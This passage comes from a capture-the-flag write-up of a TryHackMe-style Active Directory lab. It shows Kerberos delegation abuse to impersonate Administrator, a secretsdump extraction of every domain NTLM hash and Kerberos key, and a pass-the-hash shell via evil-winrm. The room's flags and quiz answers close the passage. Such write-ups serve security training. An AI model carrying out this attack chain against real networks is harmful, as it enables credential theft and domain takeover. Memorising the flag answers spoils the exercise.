[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

The output of this script will be a service ticket for the Administrator user.  
Once we have the ccache file, set it to the KRB5CCNAME variable so that it is loaded inside the memory and then we can use it to our advantage.

┌──(witty㉿kali)-[~/Downloads]
└─$ export KRB5CCNAME=Administrator.ccache 

┌──(witty㉿kali)-[~/Downloads]
└─$ cat /etc/hosts   
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.10.175.192   DC.COOCTUS.CORP

┌──(witty㉿kali)-[~/Downloads]
└─$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@COOCTUS.CORP

Valid starting       Expires              Service principal
06/30/2023 00:11:32  06/30/2023 10:11:32  oakley/DC/COOCTUS@COOCTUS.CORP
	renew until 07/01/2023 00:11:29

┌──(witty㉿kali)-[~/Downloads]
└─$ secretsdump.py -k -no-pass DC.COOCTUS.CORP
Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra

[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:a87507943c24701f8f145343cdabd2f687029f017ef5dfd3956167fcae07ae93fcf800c97591d0f8627c8b8d0a39b77004eb9f0c61005297f672ce4cd16821b232e4cfbe677501ace8ee50ebca490c8d1483765027d7a7b15ab424bf77a0c07b2af35da678074e7e8289f52e592dd75cf637805f1407a918deea5cfb260c0bc0c268fa4e1804ba2c5e895cf05b7e3f2bbad97a73938c7ad1fe6a8c4ef7b76dbf9ba18e202217c569a81ad97c3480d8f3d4c5ab7f980f46565bfb6f2f17c3d22e9a3c8788a7ed8441de525e597ef2bd5d2c2c7bc59ec70a38a0f2b241b2636e16e12bc7e83c21efeca2653ce7eed1339f
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:da77e13ab6c1f6448527f225c4eca7ad:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:da77e13ab6c1f6448527f225c4eca7ad:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
krbtgt:des-cbc-md5:d9eff2048f2f3e46
COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
DC$:aes256-cts-hmac-sha1-96:00f729e1046f10b7f9d7faa4fc5a5cd37904eadd98707f1289e2709324cf8c9f
DC$:aes128-cts-hmac-sha1-96:fd314c8a7468f2c532e6060757db3143
DC$:des-cbc-md5:c1e0ef311901d526
[*] Cleaning up... 

┌──(witty㉿kali)-[~]
└─$ evil-winrm -u Administrator -H add41095f1fb0405b32f70a489de022d -i 10.10.47.104  

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cooctus\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::797a:3666:f6e6:ed22%7
   IPv4 Address. . . . . . . . . . . : 10.10.47.104
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Shares
*Evil-WinRM* PS C:\Shares> ls


    Directory: C:\Shares


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/8/2021  12:42 PM                Home


*Evil-WinRM* PS C:\Shares> cd Home
*Evil-WinRM* PS C:\Shares\Home> ls


    Directory: C:\Shares\Home


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/8/2021  12:38 PM             28 priv-esc-2.txt
-a----         6/7/2021   8:08 PM             22 priv-esc.txt
-a----         6/7/2021   8:14 PM             17 user.txt


*Evil-WinRM* PS C:\Shares\Home> type priv-esc-2.txt
THM{Wh4t-t0-d0...Wh4t-t0-d0}
*Evil-WinRM* PS C:\Shares\Home> type priv-esc.txt
THM{0n-Y0ur-Way-t0-DA}
*Evil-WinRM* PS C:\Shares\Home> type user.txt
THM{Gu3st_Pl3as3}
*Evil-WinRM* PS C:\Shares\Home> cd c:\PerfLogs\Admin\
*Evil-WinRM* PS C:\PerfLogs\Admin> ls


    Directory: C:\PerfLogs\Admin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/7/2021   8:07 PM             22 root.txt


*Evil-WinRM* PS C:\PerfLogs\Admin> type root.txt
THM{Cr0ccCrewStr1kes!}

```

![[Pasted image 20230629215417.png]]

What is the User flag?

*THM{Gu3st_Pl3as3}*

What is the name of the account Crocc Crew planted?

*admCroccCrew*

What is the Privileged User's flag?

*THM{0n-Y0ur-Way-t0-DA}*

What is the Second Privileged User's flag?

*THM{Wh4t-t0-d0...Wh4t-t0-d0}*

What is the Root flag?

	The flag is located in c:\PerfLogs\Admin\

*THM{Cr0ccCrewStr1kes!}*

[[Year of the Owl]]